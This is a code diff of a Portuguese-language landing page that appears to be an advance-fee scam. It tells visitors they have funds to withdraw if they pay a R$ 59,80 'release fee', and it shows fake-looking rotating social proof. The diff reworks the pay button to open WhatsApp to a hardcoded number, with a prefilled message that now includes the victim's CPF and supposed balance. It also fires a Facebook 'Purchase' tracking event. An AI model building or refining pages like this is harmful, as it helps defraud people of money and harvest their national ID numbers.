@@ -237,11 +237,11 @@
                 <p class="text-xs mt-1">A taxa de liberação de <strong class="text-emerald-700 font-bold">R$ 59,80</strong> representa <strong>menos de 1%</strong> do valor total de <span id="valor-badge-taxa" class="font-mono font-bold text-emerald-700">R$ 0,00</span> que você vai resgatar!</p>
             </div>
 
-            <!-- Botão Pagar no WhatsApp -->
-            <button onclick="redirecionarWhatsApp()" 
-                class="w-full bg-emerald-600 hover:bg-emerald-700 text-white font-black py-4 rounded-xl transition duration-200 shadow-xl text-base flex items-center justify-center space-x-2 mb-5 cursor-pointer animate-pulse">
+            <!-- Botão Pagar no WhatsApp (Usando <a> tag nativa para abrir perfeitamente no celular) -->
+            <a id="btn-whatsapp" href="#" onclick="clicarWhatsApp(event)" target="_blank"
+                class="w-full bg-emerald-600 hover:bg-emerald-700 text-white font-black py-4 rounded-xl transition duration-200 shadow-xl text-base flex items-center justify-center space-x-2 mb-5 cursor-pointer animate-pulse text-center no-underline">
                 <span>💬 Pagar Taxa no WhatsApp</span>
-            </button>
+            </a>
 
             <!-- 4 Provas Sociais Dinâmicas e Rotativas -->
             <div class="border-t border-slate-200 pt-4">
@@ -264,7 +264,7 @@
 
     <!-- LÓGICA EM JAVASCRIPT -->
     <script>
-        // NÚMERO DO WHATSAPP CONFIGURADO PARA TESTE
+        // NÚMERO DO WHATSAPP CONFIGURADO
         const listaWhatsapps = [
             "5516982516678"
         ];
@@ -506,15 +506,19 @@
             }, 1000);
         }
 
-        function direcionarWhatsApp() {
-            // Dispara o evento de Purchase (Compra) no Pixel do Facebook sem valor fixo
+        function clicarWhatsApp(event) {
+            // Dispara o evento de Purchase no Pixel do Facebook
             if (typeof fbq === 'function') {
                 fbq('track', 'Purchase');
             }
 
             let numeroEscolhido = obterNumeroRotaqao();
-            let mensagem = encodeURIComponent(`Olá, meus dados foram confirmados, o saldo localizado é de ${valorGlobal} e quero pagar a taxa de emissão de R$ 59,80 para liberar meu saque.`);
-            window.location.href = `https://wa.me/${numeroEscolhido}?text=${mensagem}`;
+            let textoMensagem = `Oi quero pagar a taxa de emissao. Meu CPF é ${cpfGlobal} e tenho o valor de ${valorGlobal} disponível para saque.`;
+            let mensagemCodificada = encodeURIComponent(textoMensagem);
+
+            // Define o link correto dinamicamente no elemento <a>
+            let linkZap = `https://wa.me/${numeroEscolhido}?text=${mensagemCodificada}`;
+            event.currentTarget.href = linkZap;
         }
     </script>
 </body>
